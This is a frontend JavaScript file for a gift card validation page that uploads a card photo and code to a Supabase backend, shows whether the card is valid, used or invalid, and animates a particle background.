/* ============================================================
   CardValidator — Frontend Logic
   Supabase · Image Upload · Spiral Loader · Validation
   ============================================================ */

// ── CONFIG — paste your own Supabase project values here (see README) ───
const SUPABASE_URL    = 'https://YOUR_PROJECT.supabase.co';
const SUPABASE_ANON   = 'YOUR_ANON_PUBLIC_KEY';
const BUCKET_NAME     = 'card-images';

// ── Supabase minimal client ────────────────────────────────────
const supa = {
  async upload(file) {
    const ext  = file.name.split('.').pop();
    const path = `uploads/${Date.now()}-${Math.random().toString(36).slice(2)}.${ext}`;
    const res  = await fetch(
      `${SUPABASE_URL}/storage/v1/object/${BUCKET_NAME}/${path}`,
      {
        method: 'POST',
        headers: {
          'apikey':        SUPABASE_ANON,
          'Authorization': `Bearer ${SUPABASE_ANON}`,
          'Content-Type':  file.type,
          'x-upsert':      'true',
        },
        body: file,
      }
    );
    if (!res.ok) throw new Error(`Upload failed: ${res.statusText}`);
    return `${SUPABASE_URL}/storage/v1/object/public/${BUCKET_NAME}/${path}`;
  },

  async rpc(fn, params) {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/rpc/${fn}`, {
      method: 'POST',
      headers: {
        'apikey':        SUPABASE_ANON,
        'Authorization': `Bearer ${SUPABASE_ANON}`,
        'Content-Type':  'application/json',
      },
      body: JSON.stringify(params),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.message || 'RPC error');
    return data;
  },
};

// ── State ──────────────────────────────────────────────────────
let uploadedFile = null;

// ── DOM refs ───────────────────────────────────────────────────
const uploadZone   = document.getElementById('uploadZone');
const fileInput    = document.getElementById('fileInput');
const uploadIdle   = document.getElementById('uploadIdle');
const uploadPreview= document.getElementById('uploadPreview');
const previewImg   = document.getElementById('previewImg');
const removeImg    = document.getElementById('removeImg');
const codeInput    = document.getElementById('codeInput');
const stepUpload   = document.getElementById('stepUpload');
const stepLoading  = document.getElementById('stepLoading');
const stepResult   = document.getElementById('stepResult');
const resultContent= document.getElementById('resultContent');
const loadingMsg   = document.getElementById('loadingMsg');
const ls           = [null,'ls1','ls2','ls3','ls4'].map(id => id && document.getElementById(id));

// ── Upload zone setup ──────────────────────────────────────────
uploadZone.addEventListener('click', e => {
  if (e.target === removeImg || removeImg.contains(e.target)) return;
  if (!uploadedFile) fileInput.click();
});

uploadZone.addEventListener('dragover', e => {
  e.preventDefault();
  uploadZone.classList.add('drag-over');
});
uploadZone.addEventListener('dragleave', () => uploadZone.classList.remove('drag-over'));
uploadZone.addEventListener('drop', e => {
  e.preventDefault();
  uploadZone.classList.remove('drag-over');
  const f = e.dataTransfer.files[0];
  if (f && f.type.startsWith('image/')) setFile(f);
});

fileInput.addEventListener('change', () => {
  if (fileInput.files[0]) setFile(fileInput.files[0]);
});

removeImg.addEventListener('click', e => {
  e.stopPropagation();
  clearFile();
});

function setFile(file) {
  uploadedFile = file;
  const url = URL.createObjectURL(file);
  previewImg.src = url;
  uploadIdle.classList.add('hidden');
  uploadPreview.classList.remove('hidden');
}

function clearFile() {
  uploadedFile = null;
  previewImg.src = '';
  fileInput.value = '';
  uploadIdle.classList.remove('hidden');
  uploadPreview.classList.add('hidden');
}

// ── Validation flow ────────────────────────────────────────────
async function startValidation() {
  const code = codeInput.value.trim();
  if (!code) {
    shakeInput();
    return;
  }

  // Switch to loading step
  stepUpload.classList.add('hidden');
  stepLoading.classList.remove('hidden');
  stepResult.classList.add('hidden');

  // Animate loading steps
  const steps = [
    { el: ls[1], msg: 'Uploading card image…',         delay: 0    },
    { el: ls[2], msg: 'Reading card code…',             delay: 900  },
    { el: ls[3], msg: 'Checking database…',             delay: 1800 },
    { el: ls[4], msg: 'Finalizing result…',             delay: 2700 },
  ];

  for (const s of steps) {
    setTimeout(() => {
      steps.filter(x => x.el !== s.el).forEach(x => {
        if (x.el) x.el.classList.remove('active');
      });
      if (s.el) s.el.classList.add('active');
      loadingMsg.textContent = s.msg;
    }, s.delay);
  }

  try {
    // 1. Upload image (or skip if none)
    let imageUrl = null;
    if (uploadedFile) {
      imageUrl = await supa.upload(uploadedFile);
    }
    if (ls[1]) { ls[1].classList.remove('active'); ls[1].classList.add('done'); }

    // 2. Validate via Supabase RPC
    const result = await supa.rpc('validate_card_code', {
      p_code:      code,
      p_image_url: imageUrl,
      p_ip:        null,
      p_agent:     navigator.userAgent,
    });
    if (ls[2]) { ls[2].classList.remove('active'); ls[2].classList.add('done'); }
    if (ls[3]) { ls[3].classList.remove('active'); ls[3].classList.add('done'); }

    await sleep(600);
    if (ls[4]) { ls[4].classList.remove('active'); ls[4].classList.add('done'); }

    await sleep(400);
    showResult(result.status, result.code);

  } catch (err) {
    console.error(err);
    showResult('error', code, err.message);
  }
}

function showResult(status, code, errMsg) {
  stepLoading.classList.add('hidden');
  stepResult.classList.remove('hidden');

  const configs = {
    valid: {
      icon:  '✅',
      cls:   'valid',
      title: 'Card Verified!',
      msg:   'Your gift card is valid and ready to use. Enjoy!',
    },
    used: {
      icon:  '⚠️',
      cls:   'used',
      title: 'Already Used',
      msg:   'This card has already been redeemed. If you believe this is an error, please contact support.',
    },
    invalid: {
      icon:  '❌',
      cls:   'invalid',
      title: 'Invalid Code',
      msg:   'We couldn\'t find this card code in our system. Please double-check and try again.',
    },
    error: {
      icon:  '⚡',
      cls:   'invalid',
      title: 'Connection Error',
      msg:   errMsg || 'Something went wrong. Please check your connection and try again.',
    },
  };

  const c = configs[status] || configs.invalid;

  resultContent.innerHTML = `
    <div class="result-icon ${c.cls}">${c.icon}</div>
    <h2 class="result-title ${c.cls}">${c.title}</h2>
    <div class="result-code">${escHtml(code)}</div>
    <p class="result-msg">${c.msg}</p>
  `;
}

function resetForm() {
  stepResult.classList.add('hidden');
  stepLoading.classList.add('hidden');
  stepUpload.classList.remove('hidden');
  clearFile();
  codeInput.value = '';
  ls.filter(Boolean).forEach(el => el.classList.remove('active','done'));
}

function shakeInput() {
  const wrap = codeInput.closest('.code-input-wrap');
  wrap.style.animation = 'none';
  wrap.offsetHeight; // reflow
  wrap.style.animation = 'shake 0.4s ease';
  setTimeout(() => wrap.style.animation = '', 400);
  codeInput.focus();
}

// ── Utils ──────────────────────────────────────────────────────
const sleep    = ms => new Promise(r => setTimeout(r, ms));
const escHtml  = s  => s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

// ── Animated background canvas ─────────────────────────────────
(function initCanvas() {
  const canvas = document.getElementById('bg-canvas');
  const ctx    = canvas.getContext('2d');
  let   W, H, particles = [];

  function resize() {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }
  window.addEventListener('resize', resize);
  resize();

  class Particle {
    constructor() { this.reset(); }
    reset() {
      this.x  = Math.random() * W;
      this.y  = Math.random() * H;
      this.r  = Math.random() * 1.5 + 0.3;
      this.vx = (Math.random() - 0.5) * 0.15;
      this.vy = (Math.random() - 0.5) * 0.15;
      this.a  = Math.random() * 0.5 + 0.1;
    }
    update() {
      this.x += this.vx;
      this.y += this.vy;
      if (this.x < 0 || this.x > W || this.y < 0 || this.y > H) this.reset();
    }
    draw() {
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(180,170,255,${this.a})`;
      ctx.fill();
    }
  }

  for (let i = 0; i < 120; i++) particles.push(new Particle());

  function frame() {
    ctx.clearRect(0, 0, W, H);
    for (const p of particles) { p.update(); p.draw(); }
    // Draw lines between close particles
    for (let i = 0; i < particles.length; i++) {
      for (let j = i + 1; j < particles.length; j++) {
        const dx = particles[i].x - particles[j].x;
        const dy = particles[i].y - particles[j].y;
        const d  = Math.sqrt(dx*dx + dy*dy);
        if (d < 80) {
          ctx.beginPath();
          ctx.moveTo(particles[i].x, particles[i].y);
          ctx.lineTo(particles[j].x, particles[j].y);
          ctx.strokeStyle = `rgba(124,109,250,${0.08 * (1 - d/80)})`;
          ctx.lineWidth = 0.5;
          ctx.stroke();
        }
      }
    }
    requestAnimationFrame(frame);
  }
  frame();
})();

// ── Inject shake keyframe ──────────────────────────────────────
const style = document.createElement('style');
style.textContent = `
@keyframes shake {
  0%,100% { transform: translateX(0); }
  20%     { transform: translateX(-6px); }
  40%     { transform: translateX(6px); }
  60%     { transform: translateX(-4px); }
  80%     { transform: translateX(4px); }
}`;
document.head.appendChild(style);
